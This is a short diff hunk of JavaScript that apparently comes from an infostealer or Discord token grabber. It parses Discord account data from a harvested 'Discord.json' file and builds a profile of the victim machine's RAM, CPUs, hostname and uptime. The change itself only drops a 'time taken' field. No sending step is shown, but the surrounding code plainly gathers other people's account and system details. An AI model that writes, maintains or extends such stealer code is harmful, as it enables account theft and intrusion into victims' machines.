@@ -19,7 +19,6 @@ const json = async (zipFile) => {
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString());
   const uptime = Math.floor(Math.round(Date.now() / 1000) - os.uptime());
   const computerInfoFields = [
-    ['🕘 Time taken', Math.floor((Date.now() - startTime) / 1000) + ' seconds'],
     ['💾 RAM', Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB'],
     ['💾 CPUs', [...new Set(os.cpus().map(cpu => cpu.model.trim()))].join(', ')],
     ['👨 Name', code(os.hostname())],
